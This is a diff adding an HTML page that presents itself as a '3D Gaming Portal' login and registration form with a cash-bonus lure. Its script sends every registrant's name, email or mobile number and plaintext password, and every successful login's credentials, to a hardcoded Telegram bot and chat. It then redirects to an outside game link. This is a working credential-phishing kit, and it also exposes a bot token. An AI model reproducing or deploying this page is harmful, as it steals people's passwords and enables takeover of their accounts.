@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>3D Gaming Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box }
+        body { background: #000; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; overflow: hidden; font-family: Rajdhani, sans-serif }
+        .gaming-bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle at center, #200122 0%, #000 100%); z-index: -1 }
+        .gaming-bg::before { content: ''; position: absolute; width: 100%; height: 100%; background-image: linear-gradient(30deg, #0f0f0f 12%, transparent 12.5%, transparent 87%, #0f0f0f 87.5%, #0f0f0f), linear-gradient(150deg, #0f0f0f 12%, transparent 12.5%, transparent 87%, #0f0f0f 87.5%, #0f0f0f); background-size: 80px 140px; opacity: .3; animation: bgMove 20s linear infinite }
+        @keyframes bgMove { from { background-position: 0 0 } to { background-position: 800px 1400px } }
+
+        .top-bonus-banner { font-family: 'Orbitron'; color: #ffd700; font-size: 0.9rem; margin-bottom: 12px; text-transform: uppercase; text-shadow: 0 0 8px #ff0000; text-align: center; z-index: 20; animation: slideGlow 3s ease-in-out infinite; }
+        @keyframes slideGlow { 0%, 100% { transform: translateX(-5px); opacity: 0.7; } 50% { transform: translateX(5px); opacity: 1; text-shadow: 0 0 15px #ff0000; } }
+
+        .box { position: relative; width: 400px; background: rgba(0, 0, 0, .9); border-radius: 15px; padding: 35px; z-index: 10; box-shadow: 0 0 50px rgba(255, 0, 0, .4); border: 1px solid rgba(255, 255, 255, .1); overflow: hidden; }
+        .box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000); animation: borderRotate 4s linear infinite; z-index: -1 }
+        .box::after { content: ''; position: absolute; inset: 4px; background: #0a0a0a; border-radius: 12px; z-index: -1 }
+        @keyframes borderRotate { 100% { transform: rotate(360deg) } }
+
+        .logo-container { text-align: center; margin-bottom: 15px }
+        .game-logo { width: 75px; height: 75px; border-radius: 50%; border: 2px solid #ff0000; box-shadow: 0 0 15px #ff0000 }
+        h1 { font-family: Orbitron; font-size: 1.2rem; text-align: center; margin-bottom: 20px; background: linear-gradient(#fff, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent }
+
+        .msg-box { display: none; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; font-size: 14px; font-weight: 700 }
+        .error { background: rgba(255,0,0,.2); color: #ff4444; border: 1px solid #ff4444 }
+        .success { background: rgba(0,255,0,.2); color: #0f0; border: 1px solid #0f0 }
+
+        .input-group { position: relative; margin-bottom: 15px }
+        .input-group input { width: 100%; background: #111; border: 1px solid #333; padding: 12px 12px 12px 45px; color: #fff; border-radius: 8px; outline: none }
+        .input-group i { position: absolute; left: 15px; top: 14px; color: #ff0000 }
+        .eye-btn { left: auto !important; right: 15px; cursor: pointer; color: #ffd700 !important }
+
+        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #ff0000, #800000); border: none; color: #fff; font-family: Orbitron; font-weight: 900; cursor: pointer; border-radius: 8px; transition: 0.2s; }
+        .btn-success { background: linear-gradient(45deg, #00ff00, #008000) !important; box-shadow: 0 0 20px #00ff00; }
+        
+        .toggle-link { text-align: center; margin-top: 15px; color: #888; font-size: 14px }
+        .toggle-link span { color: #00f2ff; cursor: pointer; text-decoration: underline }
+    </style>
+</head>
+<body>
+    <div class="gaming-bg"></div>
+    <div class="top-bonus-banner">150/-Rs Bonus Free First REGISTER</div>
+
+    <div class="box">
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/gj6TNQCC/c98cd3b01baca79c90b6c7637ba80022.jpg" class="game-logo">
+        </div>
+
+        <div id="login-box">
+            <h1>PILOT LOGIN</h1>
+            <div id="logMsg" class="msg-box"></div>
+            <div class="input-group">
+                <i class="fa fa-user"></i>
+                <input id="logUser" placeholder="Email / Mobile">
+            </div>
+            <div class="input-group">
+                <i class="fa fa-key"></i>
+                <input type="password" id="logPass" class="passField" placeholder="Password">
+                <i class="fa fa-eye-slash eye-btn" onclick="togglePass(this)"></i>
+            </div>
+            <button id="logBtn" onclick="handleLogin()">START FLYING</button>
+            <p class="toggle-link">New Pilot? <span onclick="switchBox('signup')">Create Account</span></p>
+        </div>
+
+        <div id="signup-box" style="display:none">
+            <h1>REGISTER PILOT</h1>
+            <div id="regMsg" class="msg-box"></div>
+            <div class="input-group">
+                <i class="fa fa-user"></i>
+                <input id="regName" placeholder="Full Name">
+            </div>
+            <div class="input-group">
+                <i class="fa fa-phone"></i>
+                <input id="regUser" placeholder="Email / Mobile">
+            </div>
+            <div class="input-group">
+                <i class="fa fa-lock"></i>
+                <input type="password" id="regPass" class="passField" placeholder="Password">
+                <i class="fa fa-eye-slash eye-btn" onclick="togglePass(this)"></i>
+            </div>
+            <div class="input-group">
+                <i class="fa fa-lock"></i>
+                <input type="password" id="regConf" class="passField" placeholder="Confirm Password">
+                <i class="fa fa-eye-slash eye-btn" onclick="togglePass(this)"></i>
+            </div>
+            <button id="regBtn" onclick="handleRegister()">REGISTER NOW</button>
+            <p class="toggle-link">Back to <span onclick="switchBox('login')">Login</span></p>
+        </div>
+    </div>
+
+    <script>
+        const gameLink = "https://vermillion-hotteok-8f8533.netlify.app/";
+        const botToken = "8582189578:AAGSviZL5PwKL8Lk3RZbZCWjpx7ec5SiL40";
+        const chatId = "7836231285";
+        let isLoggedIn = false;
+
+        function switchBox(type) {
+            document.getElementById('login-box').style.display = (type === 'login') ? 'block' : 'none';
+            document.getElementById('signup-box').style.display = (type === 'signup') ? 'block' : 'none';
+        }
+
+        function togglePass(e) {
+            const field = e.parentElement.querySelector(".passField");
+            field.type = field.type === "password" ? "text" : "password";
+            e.classList.toggle("fa-eye-slash");
+            e.classList.toggle("fa-eye");
+        }
+
+        function showMsg(id, text, type) {
+            const el = document.getElementById(id);
+            el.innerText = text;
+            el.className = `msg-box ${type}`;
+            el.style.display = "block";
+        }
+
+        async function sendToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
+            fetch(url).catch(err => console.log("Telegram Error"));
+        }
+
+        function handleRegister() {
+            const name = document.getElementById('regName').value;
+            const user = document.getElementById('regUser').value;
+            const pass = document.getElementById('regPass').value;
+            const conf = document.getElementById('regConf').value;
+
+            if (!name || !user || !pass || !conf) return showMsg('regMsg', 'Fill all fields!', 'error');
+            if (pass !== conf) return showMsg('regMsg', 'Password Not Match', 'error');
+
+            if (localStorage.getItem(user)) {
+                return showMsg('regMsg', 'Register Account Alredy', 'error');
+            }
+
+            // Save in Local Storage
+            localStorage.setItem(user, JSON.stringify({ name, pass }));
+            
+            // Send to Telegram
+            sendToTelegram(`🚀 <b>New User Registered</b>\n👤 Name: ${name}\n📱 ID: ${user}\n🔑 Pass: ${pass}`);
+
+            showMsg('logMsg', 'Account Ready! Login Now.', 'success');
+            switchBox('login');
+        }
+
+        function handleLogin() {
+            if (isLoggedIn) {
+                window.location.href = gameLink;
+                return;
+            }
+
+            const user = document.getElementById('logUser').value;
+            const pass = document.getElementById('logPass').value;
+            const btn = document.getElementById('logBtn');
+
+            if (!user || !pass) return showMsg('logMsg', 'Fill Fields!', 'error');
+
+            const storedData = localStorage.getItem(user);
+            if (storedData) {
+                const userData = JSON.parse(storedData);
+                if (userData.pass === pass) {
+                    // Send to Telegram
+                    sendToTelegram(`✅ <b>Login Success</b>\n📱 ID: ${user}\n🔑 Pass: ${pass}`);
+
+                    showMsg('logMsg', 'Login Success!', 'success');
+                    isLoggedIn = true;
+                    btn.innerText = "ENTER GAME 🚀";
+                    btn.classList.add("btn-success");
+                    
+                    setTimeout(() => {
+                        window.location.href = gameLink;
+                    }, 1000);
+                } else {
+                    showMsg('logMsg', 'Rong Password try Again.', 'error');
+                }
+            } else {
+                showMsg('logMsg', 'No Account Found!', 'error');
+            }
+        }
+    </script>
+</body>
+</html>
